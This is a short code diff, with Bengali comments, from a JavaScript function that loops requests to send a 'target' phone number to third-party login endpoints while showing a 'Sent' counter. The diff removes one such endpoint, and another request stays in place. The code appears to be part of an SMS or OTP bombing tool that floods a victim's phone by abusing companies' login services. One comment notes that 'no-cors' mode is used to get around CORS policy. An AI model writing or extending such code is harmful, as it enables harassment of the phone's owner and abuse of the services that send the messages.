@@ -38,15 +38,6 @@ async function startProcess() {
                     mode: 'no-cors' // CORS পলিসি এড়ানোর জন্য
                 });
             } 
-            // ২ নম্বর পজিশনে Apex (POST)
-            else {
-                await fetch('https://api.apex4u.com/api/auth/login', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ "phoneNumber": target }),
-                    mode: 'cors'
-                });
-            }
 
             display.innerText = "Sent: " + i;
             
